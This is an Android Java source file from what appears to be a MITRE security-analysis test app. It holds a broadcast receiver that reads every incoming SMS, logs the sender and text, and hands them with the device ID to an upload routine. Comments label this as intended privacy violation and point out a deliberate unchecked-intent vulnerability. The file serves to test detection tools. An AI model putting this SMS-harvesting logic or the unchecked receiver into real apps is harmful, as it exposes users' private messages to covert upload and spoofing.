/*
 * Copyright 2017 The MITRE Corporation
 * Approved for Public Release; Distribution Unlimited. Case Number 17-0137.
 
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.

 * NOTICE
 * This software was produced for the U.S. Government under Basic Contract
 * No. W15P7T-13-C-A802, and is subject to the Rights in Noncommercial
 * Computer Software and Noncommercial Computer Software Documentation
 * Clause 252.227-7014 (FEB 2012)
 */

package com.example.uploaddataapp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.Settings;
import android.telephony.SmsMessage;
import android.util.Log;

public class SMSReceiver extends BroadcastReceiver {
    public SMSReceiver() {
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        // This receiver uploads the contents of all received SMSs to a remote server.
        // This privacy-violating behavior should be flagged by app security analysis tools.

        // Vulnerability: Does not check received intent's action string.
        // Impact: A malicious app could spoof fake SMSs into this receiver.
        // Retrieves a map of extended data from the intent.

        // Code from http://androidexample.com/Incomming_SMS_Broadcast_Receiver_-_Android_Example/index.php?view=article_discription&aid=62&aaid=87
        Log.d("SMSReceiver", "SMSReceiver triggered");
        final Bundle bundle = intent.getExtras();

        try {
            if (bundle != null) {
                final Object[] pdusObj = (Object[]) bundle.get("pdus");
                for (int i = 0; i < pdusObj.length; i++) {
                    SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                    String phoneNumber = currentMessage.getDisplayOriginatingAddress();
                    String senderNum = phoneNumber;
                    String message = currentMessage.getDisplayMessageBody();
                    if (phoneNumber == null || senderNum == null || message == null) {
                        return;
                    }
                    Log.i("SmsReceiver", "senderNum: "+ senderNum + "; message: " + message);
                    String android_id = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
                    if((android_id == null) || (android_id.equals(""))) {
                        android_id = "no_android_id";
                    }
                    new SendTask().execute("sms_" + android_id, "senderNum: " + senderNum + " message: " + message);
                }
            }

        } catch (Exception e) {
            Log.e("SmsReceiver", "Exception smsReceiver" +e);

        }

    }

    private class SendTask extends AsyncTask<String, Void, Void> {
        @Override
        protected Void doInBackground(String... params) {
            // params comes from the execute() call: params[0] is the url.
            com.example.uploaddataapp.SendIntentService.sendStuff(params[0], params[1]);
            return null;
        }
    }

}
